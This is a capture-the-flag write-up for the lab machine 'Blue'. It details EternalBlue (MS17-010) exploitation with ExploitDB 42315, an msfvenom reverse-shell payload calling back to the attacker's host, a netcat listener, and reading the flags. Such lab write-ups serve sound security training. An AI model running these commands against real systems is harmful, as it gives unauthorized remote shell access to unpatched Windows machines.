# Blue

# Recon

## Machine IP Setup

First, we setup the target IP and run AutoRecon on it:

```bash
export IP=10.10.10.40
```

```bash
autorecon $IP -v
```

## Initial Results

The initial results we obtain are as follows:

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled.png)

The Ports that are open are:

- 139: netbios-ssn; Microsoft Windows netbios-ssn
- 445: microsoft-ds; Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
- 135: msrpc; Microsoft Windows RPC
- 49152: msrpc; Microsoft Windows RPC
- 49153: msrpc; Microsoft Windows RPC
- 49154: msrpc; Microsoft Windows RPC
- 49155: msrpc; Microsoft Windows RPC
- 49156: msrpc; Microsoft Windows RPC
- 49157: msrpc; Microsoft Windows RPC

## Full Results

Further scanning showed no other open ports

# Enumeration (Service Version Check)

Nmap Vuln Scan:

```bash
nmap --script vuln -oA vuln $IP
```

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%201.png)

The script shows that the machine is vulnerable to MS17-010, also known as EternalBlue.

This vulnerability gives system access by exploiting Microsoft's implementation of the Server Message Block (SMB) protocol, where a specially crafted packet allows attackers to carry out RCE.

# Initial Foothold

To craft the exploit, we first search for a non-metasploit EternalBlue exploit in the Exploit Database:

```bash
searchsploit --id MS17-010
```

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%202.png)

This will show us a list of exploits, and we should choose to use 42315 as we are on windows 7.

We can clone the exploit into the working directory using the command:

```bash
searchsploit -m 42315
```

To use this exploit, we have to do three things:

1. Download mysmb.py since the exploit imports it. The download location is included in the exploit.
2. Use MSFvenom to create a reverse shell payload
3. Make changes in the exploit to add the authentication credentials and the reverse shell payload.

To accomplish the first task, we can run the following commands to download the file and rename it to mysmb.py:

```bash
wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
mv 42315.py.1 mysmb.py
```

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%203.png)

To accomplish the second task, we can generate a simple executable with a reverse shell payload with MSFvenom:

```bash
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.17.90 LPORT=4444 > eternal-blue.exe
```

To accomplish the third task, we need change the exploit to add credentials. Since we do not have valid credentials, we can try to use guest login.

To check for that, we can look at the enum4Linux scan that runs with Autorecon on SMB related ports. In the case of this box, the first related port discovered will be port 139, so the enum4Linux result will be situated there:

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%204.png)

As guest login is available, we can simply add the credentials as follows to the 42315.py:

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%205.png)

We can then also add the path to our compiled executable from the second task into the [42315.py](http://42315.py) file as follows:

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%206.png)

Now all we have to do is to set up a listener as follows:

```bash
nc -nvlp 4444
```

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%207.png)

Before we run the exploit file, we can check the connection using:

```bash
python checker.py $IP
```

If we can connect to the machine via this exploit, we will see the following:

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%208.png)

And then we just run the exploit with the command:

```bash
python 42315.py $IP
```

On our listener, we will see that we have root shell:

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%209.png)

# User Flag + Root Flag

From there, we can look for the two flags using the following commands:

```bash
cd C:\
dir user.txt /s
dir root.txt /s
```

![Untitled](Blue%20ae0cff02056c4a508ef55c815ad29dfa/Untitled%2010.png)

To view the contents of the flags, we can simply run the following commands:

```bash
type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

# Learning Points (Additional Points)

- Enum4Linux runs only on the first port that offers SMB
- Issues with searchsploit 42315:
    - Need to install the missing packages:
        - pip install --upgrade setuptools (error: invalid command 'egg_info')
        - python2 -m pip install . (In impacket directory from github, to install impacket for pip2)
    - Change variable name from "password" to "PASSWORD" to resolve naming issue (NameError: global name 'PASSWORD' is not defined)